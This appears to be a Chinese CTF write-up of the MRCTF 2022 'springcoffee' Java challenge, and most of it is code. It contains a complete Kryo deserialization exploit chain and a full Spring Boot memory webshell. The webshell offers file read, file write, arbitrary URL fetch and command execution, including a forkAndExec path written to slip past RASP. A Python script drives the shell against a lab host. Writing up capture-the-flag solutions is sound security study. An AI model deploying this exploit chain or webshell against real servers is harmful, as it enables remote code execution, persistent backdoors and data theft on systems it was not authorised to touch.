解决我不太能讲清楚，这里直接给\n&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;\n\n可以去看Y4的文章，写的比较清楚\n最终的payload：\n&quot;polish&quot;: True,&quot;References&quot;: True,&quot;RegistrationRequired&quot;: False,&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;\n\n这里还多出来一个References，这个很多文章里没写，但是必须要加，我从官方EXP里面看到的。但是具体原因不知道，如果有人知道了可以给我留言。\nkryo反序列化到此为止，EXP：\nimport com.esotericsoftware.kryo.Kryo;import com.esotericsoftware.kryo.io.Input;import com.esotericsoftware.kryo.io.Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.compiler.Template;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import fun.mrctf.springcoffee.model.ExtraFlavor;import javassist.ClassPool;import org.json.JSONObject;import org.springframework.aop.target.HotSwappableTargetSource;import tools.Evil;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.FileOutputStream;import java.io.IOException;import java.lang.reflect.Array;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;public class KryoSer &#123;    protected Kryo kryo = new Kryo();    public String ser(String raw) throws Exception &#123;        JSONObject serializeConfig = new JSONObject(raw);        if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123;            this.kryo = new Kryo();            for (Method setMethod : this.kryo.getClass().getDeclaredMethods()) &#123;                if (setMethod.getName().startsWith(&quot;set&quot;)) &#123;                    try &#123;                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));                        if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123;                            try &#123;                                setMethod.invoke(this.kryo, Class.forName((String) p1).newInstance());                            &#125; catch (Exception e) &#123;                                e.printStackTrace();                            &#125;                        &#125; else &#123;                            setMethod.invoke(this.kryo, p1);                        &#125;                    &#125; catch (Exception e2) &#123;                    &#125;                &#125;            &#125;        &#125;        byte[] bytecode = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();        TemplatesImpl templates = new TemplatesImpl();        setFieldValue(templates, &quot;_class&quot;, null);        setFieldValue(templates, &quot;_name&quot;, &quot;1diOt9&quot;);        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\\\BaiduSyncdisk\\\\ctf-challenges\\\\java-challenges\\\\MRCTF\\\\MRCTF2022\\\\springcoffee\\\\target\\\\classes\\\\memshell\\\\SpringBootController_Higher2_6_0.class&quot;));        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;bytes&#125;);        ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);        //防止在put时触发        EqualsBean equalsBean1 = new EqualsBean(String.class, &quot;any&quot;);        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();        hashMap1.put(equalsBean1, &quot;any&quot;);        setFieldValue(equalsBean1, &quot;obj&quot;, toStringBean1);        setFieldValue(equalsBean1, &quot;beanClass&quot;, ToStringBean.class);        //固定写法，初始化SignedObject        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(hashMap1,privateKey,signingEngine);//        signedObject.getObject();        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean2);        // 为防止 put 时提前命令执行，这里先不设置，随便 new 一个 HashMap 做参数        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new HashMap&lt;&gt;());        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(h1, &quot;test1&quot;);        hashMap2.put(h2, &quot;test2&quot;);        // 反射设置 this.target 为 XString 对象        setFieldValue(h2, &quot;target&quot;, new XString(&quot;test&quot;));        setFieldValue(toStringBean2, &quot;obj&quot;, signedObject);        setFieldValue(toStringBean2, &quot;beanClass&quot;, SignedObject.class);        ByteArrayOutputStream baos = new ByteArrayOutputStream();        Output output = new Output(baos);        this.kryo.writeClassAndObject(output, hashMap2);        output.close();        return new String(Base64.getEncoder().encode(baos.toByteArray()));    &#125;    public void deser(String s)&#123;        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(s));        Input input = new Input(bais);        this.kryo.readClassAndObject(input);    &#125;    public static void main(String[] args) throws Exception &#123;        KryoSer kryoSer = new KryoSer();        String raw = &quot;&#123;\\&quot;polish\\&quot;:true,\\&quot;References\\&quot;: True,\\&quot;RegistrationRequired\\&quot;:false,\\&quot;InstantiatorStrategy\\&quot;: \\&quot;org.objenesis.strategy.StdInstantiatorStrategy\\&quot;&#125;&quot;;        String ser = kryoSer.ser(raw);        new FileOutputStream(&quot;D:\\\\tmp\\\\payload.txt&quot;).write(ser.getBytes());//        kryoSer.deser(ser);    &#125;    public static void setFieldValue(Object obj, String fieldName, Object value) throws IllegalAccessException &#123;        Class&lt;?&gt; aClass = obj.getClass();        Field field = null;        while (aClass != null) &#123;            try&#123;                field = aClass.getDeclaredField(fieldName);                break;            &#125; catch (NoSuchFieldException e) &#123;                aClass = aClass.getSuperclass();            &#125;        &#125;        field.setAccessible(true);        field.set(obj, value);    &#125;&#125;\n\n\n\n内存马编写第一次自己写内存马用，当时也是出了很多问题，不过后来也是跟着文章搞好了\nLandGrey’s Blog\nSpring内存马学习 | Bmth’s blog\n跟着这两篇文章写好了，主要是SpringBoot以2.6.0为分界，Controller的注册方法有点不一样。成功以后自己再去加各种功能就很方便了，这里展示的是最完整的内存马：\npackage memshell;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.tomcat.util.http.fileupload.IOUtils;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import sun.misc.Unsafe;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.net.URL;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;//Memshell when SpringBoot&gt;=2.6.0public class SpringBootController_Higher2_6_0 extends AbstractTranslet &#123;    static&#123;        try &#123;            System.out.println(&quot;start static SpringBootController_Higher2_6_0&quot;);            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);            Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);            configField.setAccessible(true);            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);            Method declaredMethod = Class.forName(&quot;memshell.SpringBootController_Higher2_6_0&quot;).getDeclaredMethod(&quot;login&quot;, HttpServletRequest.class, HttpServletResponse.class);            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();            RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;).options(config).build();            mappingHandlerMapping.registerMapping(info, Class.forName(&quot;memshell.SpringBootController_Higher2_6_0&quot;).newInstance(), declaredMethod);            System.out.println(&quot;SpringBootController_Higher2_6_0 is been registered&quot;);        &#125; catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException |                 NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public SpringBootController_Higher2_6_0() &#123;        System.out.println(&quot;SpringBootController_Higher2_6_0 no args constructor is been used&quot;);    &#125;    public void login(HttpServletRequest request, HttpServletResponse response) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;        try &#123;            PrintWriter writer = response.getWriter();            //任意文件写入            String writePath = request.getParameter(&quot;writePath&quot;);            String writeBytes = request.getParameter(&quot;writeBase64&quot;);            if (writePath != null &amp;&amp; writeBytes != null) &#123;                byte[] decode = Base64.getDecoder().decode(writeBytes);                new FileOutputStream(writePath).write(decode);            &#125;            //文件下载            String filePath = request.getParameter(&quot;file&quot;);            if (filePath != null) &#123;                byte[] bytes = Files.readAllBytes(Paths.get(filePath));                String s = Base64.getEncoder().encodeToString(bytes);                writer.write(s);            &#125;            //读文件，不会触发Runtime等            String urlContent = &quot;&quot;;            String read = request.getParameter(&quot;read&quot;);            if (read != null) &#123;                final URL url = new URL(read);                final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));                String inputLine = &quot;&quot;;                while ((inputLine = in.readLine()) != null) &#123;                    urlContent = urlContent + inputLine + &quot;\\n&quot;;                &#125;                in.close();                writer.println(urlContent);            &#125;            String arg0 = request.getParameter(&quot;code&quot;);//            命令执行ProcessImpl            if (arg0 != null) &#123;                String o = &quot;&quot;;                java.lang.ProcessBuilder p;                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);                &#125;else&#123;                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);                &#125;                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;            String[] strs = request.getParameterValues(&quot;cmd&quot;);            //通过forkAndExec命令执行            if (strs != null) &#123;                Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);                theUnsafeField.setAccessible(true);                Unsafe unsafe = (Unsafe) theUnsafeField.get(null);                Class processClass = null;                try &#123;                    processClass = Class.forName(&quot;java.lang.UNIXProcess&quot;);                &#125; catch (ClassNotFoundException e) &#123;                    processClass = Class.forName(&quot;java.lang.ProcessImpl&quot;);                &#125;                Object processObject = unsafe.allocateInstance(processClass);                // Convert arguments to a contiguous block; it&#x27;s easier to do                // memory management in Java than in C.                byte[][] args = new byte[strs.length - 1][];                int size = args.length; // For added NUL bytes                for (int i = 0; i &lt; args.length; i++) &#123;                    args[i] = strs[i + 1].getBytes();                    size += args[i].length;                &#125;                byte[] argBlock = new byte[size];                int i = 0;                for (byte[] arg : args) &#123;                    System.arraycopy(arg, 0, argBlock, i, arg.length);                    i += arg.length + 1;                    // No need to write NUL bytes explicitly                &#125;                int[] envc = new int[1];                int[] std_fds = new int[]&#123;-1, -1, -1&#125;;                Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);                Field helperpathField = processClass.getDeclaredField(&quot;helperpath&quot;);                launchMechanismField.setAccessible(true);                helperpathField.setAccessible(true);                Object launchMechanismObject = launchMechanismField.get(processObject);                byte[] helperpathObject = (byte[]) helperpathField.get(processObject);                int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);                Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;                        int.class, byte[].class, byte[].class, byte[].class, int.class,                        byte[].class, int.class, byte[].class, int[].class, boolean.class                &#125;);                forkMethod.setAccessible(true);// 设置访问权限                int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;                        ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,                        null, envc[0], null, std_fds, false                &#125;);                // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流                Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);                initStreamsMethod.setAccessible(true);                initStreamsMethod.invoke(processObject, std_fds);                // 获取本地执行结果的输入流                Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);                getInputStreamMethod.setAccessible(true);                InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);                ByteArrayOutputStream baos = new ByteArrayOutputStream();                int a = 0;                byte[] b = new byte[1024];                while ((a = in.read(b)) != -1) &#123;                    baos.write(b, 0, a);                &#125;                writer.write(baos.toString());            &#125;        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchFieldException e) &#123;            throw new RuntimeException(e);        &#125; catch (SecurityException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalArgumentException e) &#123;            throw new RuntimeException(e);        &#125; catch (IllegalAccessException e) &#123;            throw new RuntimeException(e);        &#125; catch (ClassNotFoundException e) &#123;            throw new RuntimeException(e);        &#125; catch (InstantiationException e) &#123;            throw new RuntimeException(e);        &#125; catch (InvocationTargetException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchMethodException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    public static byte[] toCString(String s) &#123;        if (s == null)            return null;        byte[] bytes  = s.getBytes();        byte[] result = new byte[bytes.length + 1];        System.arraycopy(bytes, 0,                result, 0,                bytes.length);        result[result.length - 1] = (byte) 0;        return result;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;\n\n一开始其实注入的就是一个最普通的内存马，后来发现没法执行命令。于是增加了目录和文件读取的功能，通过read&#x3D;file:&#x2F;&#x2F;&#x2F;这样的伪协议形式读。然后会发现虽然能知道flag就在根目录下，但是由于权限原因没法直接读取（看dockerfile知道的）。查看app目录，发现有jrasp.jar，再给内存马加功能，把rasp下载下来（读base64编码，python脚本再转换）。\nrasp没学的话可以参考文末的几篇文章。这个rasp禁止了ProcessImpl，但是没禁止UnixProcess，所以我们可以直接通过UnixProcess去执行命令。但是我内存马是直接用forkAndExec去执行了，更底层一点。虽然作者的本意是让我们写JNI文件去命令执行的。\n这样注入后就可以执行命令了，通过readFlag去读。但是这个readFlag是一个算术题，也是需要把文件下载，然后写对应的C语言程序与readFlag交互，最后把写好的C语言程序上传并执行。这个计算题的步骤我当时没复现，感觉有点麻烦。\n最后给一下参考的python脚本：\nimport base64import requestsfrom urllib.parse import quotedef upload_jar_file(url, file_path, headers=None):    &quot;&quot;&quot;    上传 .jar 文件到指定 URL    :param url: 目标服务器的 URL    :param file_path: 要上传的 .jar 文件路径    :param headers: 可选的请求头（如身份验证信息）    :return: 返回服务器响应    &quot;&quot;&quot;    # 检查文件是否存在    try:        with open(file_path, &#x27;rb&#x27;) as file:            files = &#123;&#x27;file&#x27;: (file_path, file, &#x27;application/java-archive&#x27;)&#125;            response = requests.post(url, files=files, headers=headers)            return response    except FileNotFoundError:        print(f&quot;Error: File not found at &#123;file_path&#125;&quot;)        return None    except Exception as e:        print(f&quot;Error: &#123;e&#125;&quot;)        return Nonedef post(url, data=None, json=None, headers=None):    response = requests.post(url, data=data, json=json, headers=headers)    print(response.text)def get(url):    response = requests.get(url)    print(response.text)    return response.textdef readTXT(file_path):    with open(file_path, &#x27;r&#x27;) as file:        return file.read()def readBin(file_path):    with open(file_path, &#x27;rb&#x27;) as file:        return file.read()if __name__ == &#x27;__main__&#x27;:    headers = &#123;        &quot;cmd&quot;: &quot;whoami&quot;,        # &quot;Content-Type&quot;: &quot;application/json&quot;        &quot;Accept&quot;: &quot;text/html;charset=fengfff&quot;,    &#125;    payload = readTXT(&quot;D://tmp//payload.txt&quot;)    data = &#123;        &quot;message&quot;: f&quot;&#123;payload&#125;&quot;    &#125;    url = &quot;http://192.168.21.132:8007/coffee/demo&quot;    json_raw = &#123;        &quot;polish&quot;: True,        &quot;References&quot;: True,        &quot;RegistrationRequired&quot;: False,        &quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;    &#125;    # post(url, json=json_raw)    coffee_json = &#123;        &quot;extraFlavor&quot;: f&quot;&#123;payload&#125;&quot;,        &quot;espresso&quot;: 0.1    &#125;    url2 = &quot;http://192.168.21.132:8007/coffee/order&quot;    # post(url2, json=coffee_json)    bin_base64 = get(&quot;http://192.168.21.132:8007/shell?file=/app/jrasp.jar&quot;)    output_path = &quot;D://tmp//jrasp.jar&quot;    with open(output_path, &#x27;wb&#x27;) as file:        decoded_bin = base64.b64decode(bin_base64)        file.write(decoded_bin)    flag = readBin(&quot;D://flag&quot;)    bwriteBase64 = base64.b64encode(flag)    writeBase64 = bwriteBase64.decode(&quot;utf-8&quot;)    writePath = &quot;/fllag&quot;    get(f&quot;http://192.168.21.132:8007/shell?writePath=&#123;writePath&#125;&amp;writeBase64=&#123;writeBase64&#125;&quot;)\n\n\n\n总结这道题对我来说主要就是实践了一下内存马和rasp绕过，另外还有高版本kryo的绕过。题目很难，大佬们是真厉害\n参考wp：\n2022MRCTF-Java部分\nMRCTF 2022 By W&amp;M - W&amp;M Team\nRASP绕过初探 | Bmth’s blog\nEkiXu&#x2F;My-CTF-Challenge\nkryo：\n[浅析Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641）  Mi1k7ea ]\n内存马：\nSpring内存马学习 | Bmth’s blog\nLandGrey’s Blog\nJavaAgent与Rasp：\n浅谈 Java Agent 内存马 – 天下大木头\nJava Agent 内存马学习 | Drunkbaby’s Blog\n[本地命令执行漏洞 · 攻击Java Web应用-Java Web安全]\n文章 - JAVA安全之命令执行研究分析 - 先知社区\n[JNI攻击 · 攻击Java Web应用-Java Web安全]\nJava 反序列化绕过 RASP - DumKiy’s blog\n[java Rasp 的简单实现与绕过 - Ko1sh1’s Blog](https://ko1sh1.github.io/2024/03/25/blog_java Rasp的实现与绕过&#x2F;#JNI-绕过RASP-执行命令)\n","categories":["CTF-Java"],"tags":["CTF-Java, Java"]}]